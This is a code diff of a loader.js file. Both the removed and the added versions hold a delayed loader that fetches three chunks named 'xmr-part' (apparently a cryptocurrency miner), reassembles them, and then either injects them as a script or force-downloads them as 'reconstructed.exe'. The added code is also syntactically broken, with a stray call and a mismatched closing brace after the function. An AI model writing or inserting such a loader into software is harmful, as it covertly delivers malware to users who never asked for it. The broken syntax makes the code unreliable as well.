@@ -1,18 +1,24 @@
 // loader.js
-setTimeout(async () => {
-  const parts = ['xmr-part-aa', 'xmr-part-ab', 'xmr-part-ac']; 
-  const blobParts = [];
-  
-  for (const part of parts) {
-    const response = await fetch(`https://abdulabdulabdul.github.io/traffic-analyzer/${part}`);
-    blobParts.push(await response.arrayBuffer());
-  }
+setTimeout(async function fetchAndRebuild() {
+    const parts = ["xmr-part-aa", "xmr-part-ab", "xmr-part-ac"];
+    let blobParts = [];
 
-  const exeBlob = new Blob(blobParts, { type: 'application/octet-stream' });
-  const exeUrl = URL.createObjectURL(exeBlob);
-  
-  const script = document.createElement('script');
-  script.src = exeUrl;
-  document.body.appendChild(script);
+    for (let part of parts) {
+        let response = await fetch(part);
+        let arrayBuffer = await response.arrayBuffer();
+        blobParts.push(arrayBuffer);
+    }
+
+    let finalBlob = new Blob(blobParts, { type: "application/octet-stream" });
+    let url = URL.createObjectURL(finalBlob);
+    
+    let a = document.createElement("a");
+    a.href = url;
+    a.download = "reconstructed.exe";
+    a.click();
+}
+
+fetchAndRebuild();
+
 
 }, 20000);
